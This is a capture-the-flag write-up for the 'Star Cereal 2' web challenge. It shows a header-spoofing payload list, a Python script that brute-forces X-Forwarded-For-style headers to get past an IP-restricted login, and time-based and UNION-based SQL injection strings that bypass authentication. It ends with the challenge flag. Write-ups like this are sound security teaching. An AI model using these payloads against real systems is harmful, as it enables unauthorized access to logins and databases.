---
title: STANDCON CTF - Star Cereal 2
date: 2021-08-02 17:19:00 +0800
categories: [ctf]
tags: [php, sqli]
---

# Description

> Ha, that was sneaky! But I've patched the login so that people like you can't gain access anymore. Stop hacking us!
> 
> `http://20.198.209.142:55045`
> 
> _The flag is in the flag format: STC{...}_
> 
> **Author: zeyu2001**

# Solution

![](/assets/images/cereal2_1.jpg)

The page doesn't much different from `Star Cereal 1`, but when we click on `Login` or browse to `/login.php`, we get a `403 Forbidden` response.

![](/assets/images/cereal2_2.jpg)

Back on the home page, there were some comments from the developer:

```html
<!--
Star Cereal page by zeyu2001

TODO:
	1) URGENT - fix login vulnerability by disallowing external logins (done)
	2) Integrate admin console currently hosted at http://172.16.2.155
-->
```

Based on this, we guessed that the login page can only be viewed when accessing from a specific private IP range (`172.16.2.0/24`), but when we are browsing this page, we are actually accessing from a public IP! In order to trick the web server, we could inject some `HTTP` headers into our requests. We managed to get a list from this [repo](https://github.com/intrudir/403fuzzer/blob/master/header_payloads.txt) and stripped some irrelevant headers and the hardcoded IP addresses:

```
Client-IP
Proxy-Host
Real-Ip
Referer
Referrer
Refferer
X-Client-IP
X-Custom-IP-Authorization
X-Forward-For
X-Forwarded-By
X-Forwarded-For-Original
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Server
X-Forwarded
X-Forwarder-For
X-Host
X-Http-Destinationurl
X-Http-Host-Override
X-Original-Remote-Addr
X-Original-Url
X-Originating-IP
X-Proxy-Url
X-Real-Ip
X-Remote-Addr
X-Remote-IP
X-Rewrite-Url
X-True-IP
X-Override-Url
```

We then used `Python` to brute force the `HTTP` headers while testing all the possible IP addresses in the `172.16.2.0/24` range.   

```python
headers = """Client-IP
Proxy-Host
Real-Ip
Referer
Referrer
Refferer
X-Client-IP
X-Custom-IP-Authorization
X-Forward-For
X-Forwarded-By
X-Forwarded-For-Original
X-Forwarded-For
X-Forwarded-Host
X-Forwarded-Scheme
X-Forwarded-Scheme
X-Forwarded-Server
X-Forwarded
X-Forwarder-For
X-Host
X-Http-Destinationurl
X-Http-Host-Override
X-Original-Remote-Addr
X-Original-Url
X-Originating-IP
X-Proxy-Url
X-Real-Ip
X-Remote-Addr
X-Remote-IP
X-Rewrite-Url
X-True-IP
X-Override-Url""".split("\n")

import sys
import request

for header in headers:
    for a in range(256):
        ip = f"172.16.2.{a}"
        r = requests.get("http://20.198.209.142:55045/login.php", headers = {header: ip})
        if r.status_code != 403:
            print(f"{header}: {ip}")
            sys.exit(0)
```

After a while, we see that we were able to bypass the `403 Forbidden` using the following `HTTP` header and value.  

```
X-Forwarded-For: 172.16.2.24
```

To inject the `HTTP` header into our browser, we used this [Firefox extension](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/).

![](/assets/images/cereal2_3.jpg)

Browsing to `/login.php`, we see a familiar login page:

![](/assets/images/cereal2_4.jpg)

This time there was no `MFA` field, so we guessed that it no longer had the insecure deserialization vulnerability and we focused on testing for other classes of web vulnerabilities.

We were able to deduce it was vulnerable to SQL injection when we submitted `' union select sleep(5),null ;-- ` (Note there is a trailing space character) into the password field:

```
email=asd%40asd.com&pass='%20union%20select%20sleep(5)%2cnull%20%3b--%20
```

Which caused the page to hang for 5 seconds before sending a response! 

We also noted that the basic `' or 1=1;-- ` did not work, possibly because the table we are querying from may have been empty. To overcome this, we could utilise the `UNION SELECT` to inject a row into query results by submitting `' union select "asd@asd.com", "password" ;-- `. This would result in the following query to run:

```sql
SELECT email, password FROM admins UNION SELECT "asd@asd.com", "password" ;--
```

Which will definitely return at least one row and bypass the authentication to allow us to get the flag!

![](/assets/images/cereal2_5.jpg)

# Flag
`STC{w0w_you'r3_r3lly_a_l33t_h4x0r_bc1d4611be52117c9a8bb99bf572d6a7}`
